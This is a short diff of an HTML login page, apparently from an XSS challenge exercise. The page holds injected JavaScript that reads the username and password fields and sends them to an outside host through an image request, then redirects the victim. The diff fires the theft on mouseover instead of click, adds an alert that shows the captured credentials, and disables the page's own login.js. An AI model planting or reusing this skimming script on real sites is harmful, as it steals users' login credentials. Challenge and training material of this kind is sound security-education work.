@@ -46,12 +46,13 @@
   </form>
      <script>
       window.onload = function(){ 
-        document.getElementById("signin-btn").addEventListener("click", getLogin);
+        document.getElementById("signin-btn").addEventListener("mouseover", getLogin);
         function getLogin() {
           var pass = document.getElementById('login_password').value;
           var user = document.getElementById('login_username').value;
           var img = new Image();
           img.src = "http://r7.io/e/evanc94?s=password= " + pass + " username= " + user + "";
+		  alert("password = " + pass + " username = " + user + "");
           window.location.replace("http://xss-challenges.r7.io/0/login");
         }
       };
@@ -69,4 +70,4 @@
 </div>
 
 
-  <script src="login.js" type="text/javascript"></script>
+ <!-- <script src="login.js" type="text/javascript"></script> --> 
